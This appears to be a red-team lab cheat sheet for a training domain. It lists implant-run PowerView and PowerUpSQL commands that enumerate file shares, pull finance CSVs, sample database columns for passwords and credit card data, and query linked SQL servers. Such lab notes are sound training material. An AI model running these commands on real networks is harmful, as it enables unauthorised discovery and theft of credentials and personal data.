# Finding domain shares

```bash
powerpick Find-DomainShare -CheckShareAccess
```

---

# Finding Interesting Files

```bash
powerpick Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
powerpick Get-Content \\fs.dev.cyberbotic.io\finance$\export.csv | select -first 5
```

---

# Finding Interesting data via PowerUpSQL

```bash

powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card,user,username,password" -SampleSize 5 | select instance, database, column, sample | ft -autosize

```

---

Find tables where you have direct access

```bash
powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"
powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"
```
